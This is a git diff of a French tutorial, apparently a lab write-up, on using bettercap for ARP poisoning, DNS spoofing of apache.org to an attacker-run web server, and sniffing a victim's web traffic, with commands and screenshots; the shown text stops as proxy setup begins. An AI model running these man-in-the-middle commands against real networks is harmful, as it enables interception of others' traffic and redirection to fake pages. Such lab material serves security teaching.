@@ -14,7 +14,9 @@ https://github.com/bettercap/bettercap
 1- Tout d’abord, pour lancer bettercap, il suffit de lancer la commande suivante :
 
 
-`sudo bettercap`
+```bash
+sudo bettercap
+```
 
 2- Avant de commencer à voir les différentes attaques, il faut savoir que nous allons 
 utiliser des « modules », et ces derniers peuvent se configurer en utilisant la 
@@ -26,7 +28,9 @@ Et pour lancer le module, il suffit simplement d’appeler le module et d’ajou
 « on » ou « off »
 
 
-`dns.spoof on`
+```bash
+dns.spoof on
+```
 
 ![Capture d’écran 2022-01-20 095031](https://user-images.githubusercontent.com/53974876/150305317-9a5ded56-7dbd-4b82-b977-2a09c52d7b02.png)
 
@@ -56,7 +60,9 @@ Pour trouver la cible que l’on souhaite attaquer, utiliser la commande suivant
 
 Notre victime sera la machine possédant l’adresse IP : 192.168.5.99 : 
 
-`set arp.spoof.targets 192.168.5.99`
+```bash
+set arp.spoof.targets 192.168.5.99
+```
 
 
 **NB** : Par défaut, la cible est le réseau où se trouve l’attaquant. Dans notre cas, s’il y a pas du 
@@ -73,7 +79,9 @@ MAC commençant par « d8-cb » est la machine de l’attaquant
 
 Lorsque nous activons le module :
 
-`arp.spoof on`
+```bash
+arp.spoof on
+```
 
 ![Capture d’écran 2022-01-20 095839](https://user-images.githubusercontent.com/53974876/150306418-1bf1dc7b-d584-4f39-86cc-452e568f39c9.png)
 
@@ -95,10 +103,69 @@ public) en gardant le même nom de domaine.
 Nous commençons tout d’abord par configurer le spoof DNS :
 
 
-```
+```bash
 set dns.spoof.domains apache.org
 set dns.spoof.all true
 dns.spoof on
+```
+
+![Capture d’écran 2022-01-20 100331](https://user-images.githubusercontent.com/53974876/150307240-a648321a-d5b0-4cd4-acd4-c47b30128fb4.png)
+
+**NB** : la commande « set dns.spoof.all true » permet de prendre en compte les requêtes 
+provenant de l’extérieur (et non local à la machine).
+
+## Rappel : 
+
+```bash
+set arp.spoof.targets 192.168.5.99
+arp.spoof on
+```
+
+Vu que nous redirigeons les flux en provenance de « apache.org » vers l’ip de l’attaquant, nous 
+allons monter un serveur web avec Bettercap : 
+
+```bash
+set http.server.path /var/www/html
+http.server on
+```
+![Capture d’écran 2022-01-20 100517](https://user-images.githubusercontent.com/53974876/150307545-b799e339-febf-4f14-9c82-a8cbe63b5141.png)
+
+Attention de ne pas avoir un serveur web déjà allumé, sinon il faut modifier le port dans la 
+configuration du serveur dans Bettercap (set http.server.port)
+Avant la modification de la table ARP de la victime, lorsqu’il se rend sur apache.org il atteint 
+la page officielle :
+![Capture d’écran 2022-01-20 100604](https://user-images.githubusercontent.com/53974876/150307675-596afc27-aa3d-4c75-a6af-6c4b2625c100.png)
+
+
+Après l’empoisonnement du cache ARP, la page apache.org redirige vers la page web de 
+l’attaquant : 
+
+![image](https://user-images.githubusercontent.com/53974876/150307826-31b494d4-2abc-4ef1-8aa2-a63b185d72ee.png)
+
+L’attaque DNS est maintenant terminée,
+
+# Attaque Proxy
+
+
+Une attaque Proxy est le fait de pouvoir récupérer les logs de toutes les requêtes web. Il est 
+intéressant de mettre en place un proxy lorsque l’on souhaite bloquer certains sites web dans 
+une entreprise. 
+Dans notre cas, nous allons utiliser le proxy pour récupérer les pages que consulte la victime. 
+Tout d’abord, il faut configurer le niveau de verbosité du sniffer (false équivaut à réduit) : 
+
+
+```bash
+set net.sniff.verbose false
+net.sniff on
+```
+![image](https://user-images.githubusercontent.com/53974876/150307984-4b4c6db4-f6a6-4aa4-b19d-3abbec235bc4.png)
+
+Puis on configure le proxy :
+
+
+
+
+
 
 
 
